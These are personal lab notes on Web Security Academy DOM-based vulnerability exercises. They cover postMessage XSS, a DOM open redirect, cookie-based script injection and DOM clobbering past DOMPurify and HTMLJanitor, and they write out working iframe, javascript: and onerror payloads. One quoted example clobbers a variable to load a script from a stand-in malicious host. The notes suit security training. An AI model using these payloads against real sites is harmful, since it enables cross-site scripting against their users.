# Encounters

# DOM XSS using web messages and a JavaScript URL
Get print()
## Observations
- There aren't any obvious sinks on the blog page - it takes comments. 
- I've been provided an exploit server. so there's that. 
- Not on the blog/comment pages. There is a JS script block in the home page:
```
 <script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
The script block is message passing to navigation. It listens for a postMessage event. The event (e) has a data object which is copied into a URL. If the URL has http: or https: then it redirects the current page to the location.href=url. So if we embed the page in an iframe and provide the right payload we can execute XSS. 
The trick is going to be satisfying the http:/https: requirement and getting execution when we don't have a page on the site that allows for XSS right now. It may be a variation of javascript:print() that satisfies the requirement. 
```
<iframe
  src="https://0ad3002b036533f0802a0db0007400cc.web-security-academy.net/"
  onload="this.contentWindow.postMessage(
    'javascript:print(1)//http:',
    '*'
  )">
</iframe>
```
This sends the appropriate javascript payload then escapes the rest of the javascript with a comment (//)

# DOM XSS using web messages
get print()
## Observations
```
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
Embeding a post message in an iframe will trigger the payload to go into the ads div tag. 
```
<iframe
  src="https://0aec00a4036df1cc820a0b6c00710049.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```
Its as simple as providing an XSS payload. 

# DOM XSS using web messages and JSON.parse
get print()

## Observations
- Large JS script block in the homepage that has an addeventlistener which creates an iframe and includes URL content within it without any proper validation so we can provide a javascript "url".
```
<iframe
  src="https://0a3f0024034ef09680cee03500060079.web-security-academy.net/"
  onload='this.contentWindow.postMessage(
    JSON.stringify({ type: "load-channel", url: "javascript:print()" }),
    "*"
  )'>
</iframe>
```

# DOM-based open redirection
Redirect to attacker controlled site. 
## Observations
- Nothing on homepage, no addeventListeners. 
- On the blogs themselves they have this code block:
```
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```
Using an onclick event to redirect the victim when they select back to blog, the script returns the victim back to the location, so if we send a URL via an additional parameter 'url' it will route them to a destination of my chosing. 
```
https://0a00000d04dc623b809003a10067006f.web-security-academy.net/post?postId=4&url=https://exploit-0a96008e047962d480120247018d00f5.exploit-server.net/exploit#
```
It is as simple as adding the parameter and a hash then clicking "back to blog" at the bottom of the page. 

# DOM-based cookie manipulation
Get print()
## Observations
- In the products page I can see that there is an href to the link for my last view product. I can then see that its set to a cookie value for me as well. 
- See if we can inject a viable payload into my cookies. Going to try targeted scan at selected insertion point to see if Burp will find it. It did...
```
GET /product?productId=2 HTTP/2
Host: 0ace008c03865d6082d0caf600460000.web-security-academy.net
Cookie: session=DAxxWVRAZrwWa2eoUpPtagoD8YlSUgcU; lastViewedProduct=https://0ace008c03865d6082d0caf600460000.web-security-academy.net/product?productId=2cb3pm'><script>alert(1)</script>nz57u
```
A good payload for this:
```
<iframe src="https://0ace008c03865d6082d0caf600460000.web-security-academy.net/product?productId=2&'><script>print()</script>" onload="if(!window.x)this.src='https://0ace008c03865d6082d0caf600460000.web-security-academy.net';window.x=1;">
```
Loading the product URL causes the site to set/update the lastViewedProduct cookie to the full URL you just visited (including your injected &'><script>print()</script>). This bypasses cross-site cookie restrictions because the request is a first-party navigation to the victim origin.
The onload then swaps the iframe’s src to the home page (/). The home page’s DOM code reads lastViewedProduct and uses it to build HTML (likely with innerHTML), so the stored <script>print()</script> executes.
A bit stealthier version:
```
<iframe
  src="https://0ace008c03865d6082d0caf600460000.web-security-academy.net/?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E"
  style="width:0;height:0;border:0;visibility:hidden"
  onload="if(!this.dataset.hit){
            this.dataset.hit=1;
            location.href='https://0ace008c03865d6082d0caf600460000.web-security-academy.net/';  // top-level nav
          }">
</iframe>
```

# DOM clobbering to enable XSS
DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.

A common pattern used by JavaScript developers is:
```
var someObject = window.someObject || {};
```
If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:
```
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```
To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:
```
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```
As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

Get an alert()
## Observations
- Comment specifically say that HTML is allowed, there's our overwrite to Clobber. 
- /resources/js/loadCommentsWithDomClobbering.js
```
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(data) {
        return data.replace(/[<>'"]/g, function(c){
            return '&#' + c.charCodeAt(0) + ';';
        })
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
            let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

            let divImgContainer = document.createElement("div");
            divImgContainer.innerHTML = avatarImgHTML

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(divImgContainer);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```
1.	Makes an AJAX request to fetch comments JSON.
2.	Parses the JSON.
3.	For each comment, dynamically builds DOM elements (author, website link, avatar image, body, etc.).
4.	Appends those to a container with id="user-comments".
5.	Uses some escaping/sanitization (escapeHTML, DOMPurify) to defend against XSS, but not consistently.

Potential clobber targets:
	•	window.defaultAvatar 
	•	DOMPurify (object with .sanitize)
	•	Element with id="author" (created by the code)
	•	user-comments container (looked up with getElementById)

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```
We can overwrite the default avatar value by providing it twice so that when the next user posts they inherit the one we've overwritten and it causes the alert. This is due to:
```
let defaultAvatar = window.defaultAvatar || { avatar: '/resources/images/avatarDefault.svg' }
```

•	This is “safe” if window.defaultAvatar is undefined, because it falls back to the hardcoded object.
•	But if an attacker can make window.defaultAvatar exist, then the fallback never runs — the code uses the attacker-supplied object.

This is what DOM clobbering targets: making HTML elements with certain id/name values that get auto-exposed as global variables/properties.

The way the payload clobbers the DOM is that browsers will create implicit globals for elements with IDs. When you have multiple anchors with the same ID you get a collection that shows up as a window.<ID>. So if we can control the defaultAvatar.avatar you can control the URL but the payload needs to survive DOMPurify. The ContentID scheme from email is allowed in DOMPurify and it isn't encoded. So when the href in the payload is expanded we go from:
```
cid:"onerror=alert(1)//
to 
<img class="avatar" src="cid:" onerror=alert(1)//">
```
Why two subsequent posts?

- First comment: you plant the DOM-clobbering anchors. They persist in the stored comments and become part of the DOM on every subsequent render.
- When the page reloads (or you post a second comment to trigger re-render), the JS executes again. Now window.defaultAvatar resolves to your anchors collection, which exposes an avatar property pointing to your malicious href.
- The script builds an <img> tag with src=cid:" onerror=alert(1)// → browser parses it → XSS.

# Clobbering DOM attributes to bypass HTML filters
Get print()
## Observations
- No HTML allowed this time. 
- DOM Invader does find sinks. 
- resources/js/loadCommentsWithHtmlJanitor.js
```
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();
    let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? comment.avatar : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + janitor.clean(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = janitor.clean(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```
Builds a DOM tree for each comment:
	•	Creates a <p> (firstPElement) that will contain:
	•	(optionally) an <a id="author" href="{comment.website}"> (but no link text yet),
	•	the author name,
	•	the date,
	•	then an <img class="avatar" src="{comment.avatar || default}">.
	•	It sanitizes only author/body via HTMLJanitor:
```
let janitor = new HTMLJanitor({
  tags: { input:{name:true,type:true,value:true}, form:{id:true}, i:{}, b:{}, p:{} }
});
…
firstPElement.innerHTML = firstPElement.innerHTML + janitor.clean(comment.author);
…
commentBodyPElement.innerHTML = janitor.clean(comment.body);
```
So attackers are allowed to inject ```<form id=...> ```and ```<input name=... value=...>``` in author or body.

	•	It repeatedly rewrites firstPElement.innerHTML (fragile pattern).

```
<form id=author><input name=href value="javascript:print()"></form>
```
Does break out to get an HTML form but doesn't execute JS because it isn't called again but we know form is the right tag now. 
That is because within the janitors/sanitizers its stripping dangerous attributes by iterating through named nodes but inside the form any descendant control with an ID or name is property of the form. 
```
<form id=x tabindex=0 onfocus=print()>
  <input id=attributes>
</form>
```
on exploit server: call the form's onfocus by loading in an iframe:
```
<iframe src=https://0aae000b034fa06382d03e7f0064006f.web-security-academy.net/post?postId=7 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```
	•	<input id=attributes> clobbers form.attributes on your <form id=x>.
	•	That breaks the sanitizer’s “strip attributes” step for the form, so tabindex + onfocus stay.
	•	Navigating to #x focuses the form (thanks to tabindex=0), which fires onfocus=print().



